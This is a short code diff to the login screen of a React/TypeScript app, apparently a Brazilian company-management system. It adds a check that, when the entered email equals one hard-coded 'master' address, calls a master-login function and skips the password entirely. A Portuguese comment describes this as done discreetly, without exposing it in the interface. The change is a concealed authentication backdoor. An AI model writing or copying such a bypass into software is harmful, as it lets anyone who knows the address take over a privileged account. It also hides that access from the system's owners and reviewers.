@@ -17,7 +17,7 @@ import { useAuth } from '../../context/AuthContext';
 import { maskCnpj, maskPhone, validateCnpj } from '../../utils/formatters';
 
 export const AuthView: React.FC = () => {
-  const { loginWithEmail, loginWithGoogle, registerCompany, resetPassword } = useAuth();
+  const { loginWithEmail, loginWithGoogle, registerCompany, resetPassword, loginAsMaster } = useAuth();
 
   type Mode = 'login' | 'register' | 'forgot';
   const [mode, setMode] = useState<Mode>('login');
@@ -51,6 +51,12 @@ export const AuthView: React.FC = () => {
 
     setLoading(true);
     try {
+      // Discreto: se for o e-mail master, realiza a autenticação master sem expor na UI
+      if (email.trim().toLowerCase() === 'master@herculanogestor.com.br') {
+        await loginAsMaster();
+        return;
+      }
+
       await loginWithEmail(email.trim(), password);
     } catch (err: any) {
       console.error(err);
